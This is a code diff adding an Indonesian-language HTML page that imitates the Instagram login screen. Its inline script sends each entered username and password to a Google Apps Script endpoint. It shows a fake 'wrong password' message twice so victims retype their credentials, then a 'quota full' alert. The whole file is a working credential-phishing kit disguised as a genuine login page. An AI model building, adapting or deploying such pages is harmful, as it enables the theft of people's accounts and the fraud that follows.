@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instragram</title>
+    <link rel="shortcut icon" type="x-icon" href="ig.png">
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css
+    "
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="login-box">
+        <div class="img">
+          <img src="instagram.png" alt="" />
+        </div>
+        <form action="" name="submit-to-google-sheet" class="form" >
+          <input
+            type="text"
+            placeholder="Nomor telepon,email atau nama pengguna" name="nama"
+          />
+          <input type="password" placeholder="Kata Sandi" minlength="6" name="pass" />
+          <a href="/">
+            <p class="lupaPass">Lupa kata sandi?</p>
+          </a>
+          <button type="submit" class="btn-masuk" disabled>Masuk</button>
+        </form>
+        <p class="errorMassage"></p>
+        <div class="div-span">
+          <span>Lupa detail login Anda?</span>
+          <span class="span-2">Dapatkan bantuan untuk login.</span>
+        </div>
+        <div class="atau">
+          <hr />
+          <span>ATAU</span>
+          <hr />
+        </div>
+        <a href="/">
+        <button id="btn-fb" type="submit">
+            <i class="fa-brands fa-facebook"></i>
+            <h4>Masuk dengan Facebook</h4>
+          </button>
+        </a>
+        <div class="footer">
+          <div style="margin-top: 20px">
+            <span>Tidak punya akun?</span>
+            <span class="span-2">Buat Akun.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="index.js"></script>
+    <script>
+      let handleNumber = 0
+const errorMassage = document.querySelector('.errorMassage')
+
+function elseHandle() {
+    errorMassage.innerHTML = ''
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => console.log('Success!', response))
+          .catch(error => console.error('Error!', error.message))
+    setTimeout(() => {
+        alert('maaf kuota untuk ini sudah penuh')
+    }, 800);
+}
+  function handleSend() {
+    errorMassage.innerHTML = 'Maaf, kata sandi Anda salah. Silakan periksa kembali kata sandi Anda.'
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => console.log('Success!', response))
+          .catch(error => console.error('Error!', error.message))
+  }
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbxvz7WDm7Tb98XLriJqYAt-wcy6EsVMSg_umnehLKSHlpGieP_fJUP7zosmDd82xkHj/exec'
+      const form = document.forms['submit-to-google-sheet']
+    
+      form.addEventListener('submit', e => {
+        e.preventDefault()
+        handleNumber++
+    handleNumber <= 2 ? handleSend() : elseHandle()
+      })
+    </script>
+  </body>
+</html>
